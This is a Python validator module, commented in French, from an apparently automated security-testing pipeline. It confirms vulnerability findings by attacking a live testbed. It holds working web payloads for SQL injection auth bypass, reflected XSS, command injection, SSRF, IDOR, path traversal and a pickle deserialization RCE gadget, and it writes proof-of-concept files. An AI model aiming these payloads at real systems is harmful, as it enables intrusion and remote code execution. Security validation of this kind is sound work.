"""Validator — reproduction clean-room sur le testbed live (FR-060..066).

Reçoit le finding et reconstruit l'exploit à partir de sa seule classe (indépendant
du raisonnement du Triager, FR-060). Pose `exploited` UNIQUEMENT si l'impact phare est
directement observé sur le testbed (Constitution VII), et écrit un PoC runnable (FR-063).
"""
from __future__ import annotations

import base64
import os
import pickle
import subprocess
import urllib.parse
import urllib.request


def _get(base, path):
    with urllib.request.urlopen(base + path, timeout=4) as r:
        return r.status, r.read().decode(errors="replace")


def _deser_payload():
    class P:
        def __reduce__(self):
            return (subprocess.check_output, (["echo", "FORGE_DESER_PWNED"],))
    return base64.b64encode(pickle.dumps(P())).decode()


def _exploit(cwe, base):
    """Retourne (succès, requête, impact_observé) en attaquant le testbed."""
    try:
        if cwe == "CWE-89":  # SQLi -> bypass d'auth
            q = "/login?username=" + urllib.parse.quote("admin' --") + "&password=x"
            s, b = _get(base, q)
            return ('"ok": true' in b.lower(), q, "Authentification contournée sans mot de passe valide")
        if cwe == "CWE-79":  # XSS réfléchi
            q = "/search?q=" + urllib.parse.quote("<script>alert(1)</script>")
            s, b = _get(base, q)
            return ("<script>alert(1)</script>" in b, q, "Payload <script> réfléchi non échappé")
        if cwe == "CWE-78":  # injection de commande
            q = "/admin/ping?host=" + urllib.parse.quote("127.0.0.1; echo FORGE_PWNED")
            s, b = _get(base, q)
            return ("FORGE_PWNED" in b, q, "Commande injectée exécutée (sortie observée)")
        if cwe == "CWE-918":  # SSRF -> ressource interne
            internal = base + "/health"
            q = "/imageproxy?url=" + urllib.parse.quote(internal)
            s, b = _get(base, q)
            return ("vulnshop" in b, q, "Le serveur a récupéré une URL interne fournie par l'attaquant")
        if cwe == "CWE-639":  # IDOR
            q = "/profile?id=3"
            s, b = _get(base, q)
            return ('"role": "admin"' in b and "ssn" in b, q, "Données d'un autre utilisateur (admin, SSN) exposées")
        if cwe == "CWE-22":  # path traversal
            q = "/avatar?file=" + urllib.parse.quote("../db.py")
            s, b = _get(base, q)
            return ("authenticate" in b or "SELECT" in b, q, "Lecture d'un fichier hors du dossier autorisé")
        if cwe == "CWE-502":  # désérialisation non sûre -> RCE
            q = "/prefs?c=" + urllib.parse.quote(_deser_payload())
            s, b = _get(base, q)
            return ("FORGE_DESER_PWNED" in b, q, "Exécution de code via désérialisation (sortie observée)")
    except Exception as e:  # noqa: BLE001
        return (False, "", f"erreur: {e}")
    return (False, "", "classe non exploitable en live")


def handle(task, ctx, agent_id) -> list:
    fp = task["payload"]["fp"]
    cwe = task["payload"]["cwe"]
    f = ctx.findings.get(fp)
    if not f or not ctx.testbed_url:
        return []
    ctx.llm.complete(role="validator", instance=agent_id, correlation_id=fp,
                     prompt=f"Reproduis {cwe} sur le testbed.", system="Vérificateur clean-room.")
    ok, request, impact = _exploit(cwe, ctx.testbed_url)
    if ok:
        poc_dir = os.path.join(ctx.run_dir, "poc")
        os.makedirs(poc_dir, exist_ok=True)
        poc_path = os.path.join(poc_dir, f"{fp}.md")
        with open(poc_path, "w", encoding="utf-8") as fh:
            fh.write(f"# PoC — {f['title']} ({cwe})\n\n"
                     f"Cible : `{{TESTBED}}`\n\nRequête :\n```\nGET {request}\n```\n\n"
                     f"Impact observé : {impact}\n")
        ctx.findings.set_exploited(fp, poc_path)
    else:
        ctx.events.emit("validate_fail", finding=fp, reason=impact)  # ne change PAS le TP (FR-062)
    return []
